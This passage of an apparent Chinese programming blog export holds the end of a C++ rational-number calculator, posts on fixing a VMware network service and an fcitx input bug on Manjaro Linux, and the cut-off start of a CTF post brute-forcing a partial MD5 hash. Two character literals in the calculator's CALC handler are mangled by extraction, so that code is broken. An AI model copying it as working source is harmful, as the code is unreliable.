class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//====================DELETE======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> DELETE: <span class="comment">//format: delete name</span></span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">2</span>) <span class="comment">//检查参数数量是否正确</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> add = getAddress(instructions[<span class="number">1</span>]); <span class="comment">//获取地址</span></span><br><span class="line">					<span class="keyword">if</span> (add != <span class="number">-1</span>)<span class="comment">//因为重载了等号, erase会删除错误</span></span><br><span class="line">					&#123;</span><br><span class="line">						nums.erase(nums.begin() + add);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"删除成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有此标识符的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================EXIT=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> EXIT:</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">1</span>) <span class="comment">//fotmat: exit</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span>; <span class="comment">//这里break跳出的是switch,所以用return</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================CALC=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> CALC:</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">3</span>) <span class="comment">//fotmat: calc name expression</span></span><br><span class="line">				&#123;			</span><br><span class="line">					<span class="keyword">bool</span> isHave$ = <span class="literal">false</span>;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; instructions[<span class="number">2</span>].size(); ++i)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (instructions[<span class="number">2</span>][i] == '</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">)</span><br><span class="line">						&#123;</span><br><span class="line">							isHave$ = <span class="literal">true</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (!isHave$)<span class="comment">//不含有$才能进行下一步, 避免用户输入$tempX导致bug</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">int</span> add = getAddress(instructions[<span class="number">1</span>]);</span><br><span class="line">						<span class="keyword">if</span> (add != <span class="number">-1</span>) <span class="comment">//如果存在这个名字的变量, 将其赋值为结果</span></span><br><span class="line">						&#123;</span><br><span class="line">							Rational_Numbers result = calcEngine(instructions[<span class="number">2</span>]);</span><br><span class="line">							<span class="keyword">if</span> (!wrong)<span class="comment">//确认表达式计算正确</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="built_in">string</span> name = nums[add].name;</span><br><span class="line">								nums[add] = result;</span><br><span class="line">								nums[add].name = name;</span><br><span class="line">								<span class="built_in">cout</span> &lt;&lt; <span class="string">"覆盖成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span><span class="comment">//计算过程出错就直接退出</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span><span class="comment">//如果不存在这个名字的变量, 创建一个新的变量</span></span><br><span class="line">						&#123;					</span><br><span class="line">							<span class="keyword">if</span> (checkVaild(instructions[<span class="number">1</span>]))<span class="comment">//检查新变量名字的合法性</span></span><br><span class="line">							&#123;</span><br><span class="line">								Rational_Numbers result = calcEngine(instructions[<span class="number">2</span>]);</span><br><span class="line">								result.name = instructions[<span class="number">1</span>];</span><br><span class="line">								<span class="keyword">if</span> (!wrong)<span class="comment">//确认表达式计算正确</span></span><br><span class="line">								&#123;</span><br><span class="line">									nums.push_back(result);</span><br><span class="line">									<span class="built_in">cout</span> &lt;&lt; <span class="string">"变量创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span><span class="comment">//计算过程出错就直接退出</span></span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="built_in">cout</span> &lt;&lt; <span class="string">"新变量的标识符非法"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"表达式非法"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (instructions.size() == <span class="number">2</span>) <span class="comment">//fotmat: calc expression</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">bool</span> isHave$ = <span class="literal">false</span>;</span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; instructions[<span class="number">1</span>].size(); ++i)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (instructions[<span class="number">1</span>][i] == '</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">)</span><br><span class="line">							&#123;</span><br><span class="line">								isHave$ = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">if</span> (!isHave$)</span><br><span class="line">						&#123;</span><br><span class="line">							Rational_Numbers result = calcEngine(instructions[<span class="number">1</span>]);</span><br><span class="line">							<span class="keyword">if</span> (!wrong)<span class="comment">//确认表达式计算正确</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="built_in">cout</span> &lt;&lt; <span class="string">"结果是："</span> &lt;&lt; result &lt;&lt; <span class="string">"   实数结果为"</span> &lt;&lt; result.realNumber() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span><span class="comment">//计算过程出错就直接退出</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">"表达式非法"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================HELP=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> HELP:</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"WRITE 1.输入参数创建新的/覆盖变量.       格式: write name numerator(分子) denominator(分母)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"      2.用已经有的变量创建新的/覆盖变量. 格式: write name existedName"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"DELETE 删掉已有的变量. 格式: write name existedName"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"RENAME 更改变量的标识符. 格式: rename oldname newname"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"LIST 输出所有变量. 格式:list"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"READ 输出特定变量. 格式:read"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"CALC 1.计算表达式并将结果创建新的/覆盖变量. 格式: calc name expression"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"     2.计算表达式并将结果输出.              格式: calc expression"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"     正确表达式示例:test1*-test2-2\*test3/233\*test4+666/-233"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"     注意表达式中间不能有空格, 且不能是test*0.1这样, 如果想要乘0.1等小数需要创建一个变量值为1/10然后计算"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"SAVE 将所有变量保存. 格式: save"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"LOAD 将保存的变量载入程序. 格式: load"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"EXIT 退出程序. 格式: exit"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"PS:  所有指令以及变量不区分大小写"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125; </span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================SAVE=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> SAVE:</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">string</span> temp;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"确定要这么做么, 这将导致之前的文件被覆盖(y/n)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					getline(<span class="built_in">cin</span>, temp);</span><br><span class="line">					<span class="keyword">if</span> (temp == <span class="string">"y"</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						fstream strm;</span><br><span class="line">						strm.open(getDataDir(), ios::ate | ios::out);<span class="comment">//覆盖方式打开, 若不存在此文件则创建</span></span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i)</span><br><span class="line">						&#123;</span><br><span class="line">							strm &lt;&lt; nums[i].name &lt;&lt; <span class="built_in">endl</span> &lt;&lt; nums[i].numerator &lt;&lt; <span class="built_in">endl</span> &lt;&lt; nums[i].denominator &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"保存成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"已取消"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================LOAD=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> LOAD:</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					ifstream strm;</span><br><span class="line">					strm.open(getDataDir());</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (strm.good())</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">string</span> strtemp;					</span><br><span class="line">						Rational_Numbers objtemp;</span><br><span class="line">						nums.clear();<span class="comment">//删除当前所有的变量</span></span><br><span class="line">						<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							getline(strm, strtemp);</span><br><span class="line">							objtemp.name = strtemp;</span><br><span class="line">							getline(strm, strtemp);</span><br><span class="line">							objtemp.numerator = str2int(strtemp);</span><br><span class="line">							getline(strm, strtemp);</span><br><span class="line">							objtemp.denominator = str2int(strtemp);</span><br><span class="line">							<span class="keyword">if</span> (!strm.good())</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">break</span>;<span class="comment">//如果读取完毕, 退出循环.</span></span><br><span class="line">							&#125;</span><br><span class="line">							nums.push_back(objtemp); <span class="comment">//将变量录入程序</span></span><br><span class="line">						&#125;				</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"读取成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到储存文件"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//====================RENAME======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> RENAME: <span class="comment">//format: rename name newname</span></span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (checkVaild(instructions[<span class="number">2</span>])) <span class="comment">//检查新名字是否合法</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">int</span> add = getAddress(instructions[<span class="number">1</span>]);</span><br><span class="line">						<span class="keyword">if</span> (add != <span class="number">-1</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							nums[add].name = instructions[<span class="number">2</span>];</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">"重命名成功"</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//本来还想加个新名字和旧名字一样不能改, 后来想想又要再加个if 而且没啥用...就算了</span></span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有这个标识符的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">"标识符非法"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;		</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================LIST=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> LIST: <span class="comment">//format: list</span></span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">1</span>) <span class="comment">//检查参数数量是否正确</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">					<span class="built_in">cout</span>.width(<span class="number">5</span>);</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"=============================================================================="</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; setw(<span class="number">8</span>) &lt;&lt; <span class="string">"编号"</span> &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; <span class="string">"标识符"</span> &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; <span class="string">"值"</span> &lt;&lt; <span class="string">"实数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; setw(<span class="number">8</span>) &lt;&lt; i + <span class="number">1</span> &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; nums[i].name &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; nums[i] &lt;&lt; nums[i].realNumber() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//重载过&lt;&lt;符号, 所以能直接输出</span></span><br><span class="line">					&#125;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"=============================================================================="</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					<span class="built_in">cout</span>.unsetf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//=====================READ=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> READ:</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">2</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> add = getAddress(instructions[<span class="number">1</span>]);</span><br><span class="line">					<span class="keyword">if</span> (add != <span class="number">-1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; instructions[<span class="number">1</span>] &lt;&lt; <span class="string">"的值为："</span> &lt;&lt; nums[add] &lt;&lt;<span class="string">"  实数值为"</span>&lt;&lt; nums[add].realNumber() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"不存在标识符为"</span> &lt;&lt; instructions[<span class="number">1</span>] &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入正确数量的参数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;		</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyioEngine ioEngine;</span><br><span class="line">	ioEngine.start();</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>解决 VMWare Network Service 无法启动的问题</title>
    <url>/2018/09/21/%E8%A7%A3%E5%86%B3%20VMWare%20Network%20Service%20%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>今天需要在 Linux 下启动虚拟机, 但是不知为何 <code>vmware-networks.service</code> 尝试好几次都无法启动, 干脆就跟着提示的 <code>journalctl -xe</code> 看看到底出了啥错, 说不定能修复呢 233 日志结果如下</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- vmware-networks.service 单元已开始启动.</span><br><span class="line">9月 21 16:50:25 rmb122-pc modprobe[16455]: modprobe: FATAL: Module vmnet not found in directory &#x2F;lib&#x2F;modules&#x2F;4.14.69-1-MANJARO</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: Bridge process created.</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: RTM_NEWLINK: name:enp3s0 index:2 flags:0x00011043</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: Adding interface enp3s0 index:2</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: Can&#39;t open vmnet device &#x2F;dev&#x2F;vmnet0 (No such device or address).</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: RTM_NEWLINK: name:wlp2s0 index:3 flags:0x00001002</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: Can&#39;t open vmnet device &#x2F;dev&#x2F;vmnet0 (No such device or address).</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: RTM_NEWROUTE: index:2</span><br><span class="line">9月 21 16:50:25 rmb122-pc vmnetBridge[16474]: Can&#39;t open vmnet device &#x2F;dev&#x2F;vmnet0 (No such device or address).</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmware-networks[16456]: Failed to enable hostonly virtual adapter on vmnet1</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: Internet Software Consortium DHCP Server 2.0</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: Copyright 1995, 1996, 1997, 1998, 1999 The Internet Software Consortium.</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: All rights reserved.</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: </span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: Please contribute if you find this software useful.</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: For info, please visit http:&#x2F;&#x2F;www.isc.org&#x2F;dhcp-contrib.html</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: </span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: Configured subnet: 192.168.252.0</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: Setting vmnet-dhcp IP address: 192.168.252.254</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: Cannot open &#x2F;dev&#x2F;vmnet1: No such device or address</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmnet-dhcpd[16492]: exiting.</span><br><span class="line">9月 21 16:50:26 rmb122-pc vmware-networks[16456]: Failed to start DHCP service on vmnet1</span><br></pre></td></tr></table></figure>

<p>去 <code>/dev</code> 下看了看, vmnet 0-3 都是有的, 感觉问题出在 <code>9月 21 16:50:25 rmb122-pc modprobe[16455]: modprobe: FATAL: Module vmnet not found in directory /lib/modules/4.14.69-1-MANJARO</code> 上, 毕竟前几天刚更新, 可能是版本号的原因.  </p>
<p>到 <code>/lib/modules</code> 下一看, 还真是如此, 里面的是 <code>4.14.70-1-MANJARO</code>, <code>sudo ln -s 4.14.70-1-MANJARO 4.14.69-1-MANJARO</code> 建一个软链接, 再尝试启动服务, 搞定, 看来还真不是软件越新越好啊 233 不过至少能找到错误原因, 如果是 windows 底下出现这种莫名其妙的问题可能就凉凉了 (逃</p>
<p>P.S. 真实原因其实是内核更新了我没重启. 硬盘上当然没有老版本的内核模块, 而且新版本内核模块在 ABI 变动后也加载不进内存中的老版本内核 233, 重启一下就好了</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>解决一个 fcitx 的小小 bug</title>
    <url>/2018/04/30/%E8%A7%A3%E5%86%B3%E4%B8%80%E4%B8%AA%20fcitx%20%E7%9A%84%E5%B0%8F%E5%B0%8F%20bug/</url>
    <content><![CDATA[<p>之前安装了 windows + linux 的双系统, 但是在 linux 使用过程中发现有时候 fcitx 输入时会出现漏字母的现象.  </p>
<a id="more"></a>

<p>比如输入 <code>jing le</code>, 在输入法中只会出现 <code>jig l</code>, <code>n</code> 和 <code>e</code> 直接跑到了输入框中. 百度了一下, 运行 fcitx-diagnose, 发现原来是缺少了 fcitx-gtk3 和 fcitx-gtk2 这两个包, 安装后注销重新登录就不会出现这个现象了. 比较奇葩的是不装竟然还能用且没有明显的提示… 我还是用 fcitx-diagnose 这个指令才发现缺少这些包的… 之后还发现 <code>OBS</code> 录制的时候会闪屏, 不过只要把 <code>设置</code>-&gt;<code>显示和监控</code>-&gt;<code>混成器</code>里面的垂直同步改成 <code>从不</code> 就行了.</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>递归爆破 MD5</title>
    <url>/2018/01/06/%E9%80%92%E5%BD%92%E7%88%86%E7%A0%B4%20MD5/</url>
    <content><![CDATA[<p>做到一题要用爆破的, 刚刚好拿来练练递归. 题目如下:</p>
<blockquote>
<p>python大法好！ 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2 要求你还原出他并且加上nctf{}提交 已知线索 明文为： TASC?O3RJMV?WDJKX?ZM<br>题目来源：安恒杯</p>
</blockquote>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _md5</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>) <span class="comment">#增加递归的上限</span></span><br><span class="line"></span><br><span class="line">table=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    table+=chr((ord(<span class="string">'a'</span>)+i))</span><br><span class="line">    table+=chr((ord(<span class="string">'A'</span>)+i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    table+=chr((ord(<span class="string">'0'</span>)+i)) <span class="comment">#构造字符表a-zA-Z0-9</span></span><br><span class="line"></span><br><span class="line">part1=<span 